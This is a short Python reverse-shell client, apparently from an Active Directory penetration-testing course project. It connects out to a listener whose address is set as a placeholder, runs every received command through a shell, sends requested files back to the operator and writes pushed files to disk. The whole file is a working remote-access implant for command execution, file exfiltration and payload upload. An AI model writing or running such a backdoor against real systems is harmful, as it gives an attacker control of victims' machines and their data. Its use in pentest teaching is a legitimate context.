import socket
import subprocess
import os

# Ruben - Enkaoua GL4DI4T0R
# From the AD PT project https://github.com/rubenformation/Active-Directory-PT
# Inspired from the Python for pentest course (Hussam Khrais)

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def upload(s, path):
    path = path.split('/')[-1]
    f = open(path, 'wb')
    while True:
        bits = s.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            break
        f.write(bits)

def connecting():
    s = socket.socket()
    s.connect(("127.0.0.1", 8080)) # Server IP and Listening Port

    while True:
        command = s.recv(1024)

        if 'terminate' in command.decode():
            s.close()
            break
        elif 'get' in command.decode():
            get, path = command.decode().split("|")
            try:
                transfer(s, path)
            except:
                pass
        elif 'put' in command.decode():
            put, path = command.decode().split("|")
            try:
                upload(s, path)
                s.send('[+] Transfer Complete'.encode())
            except:
                s.send('[-] There was a problem with the transfer'.encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())
def main():
    connecting()
main()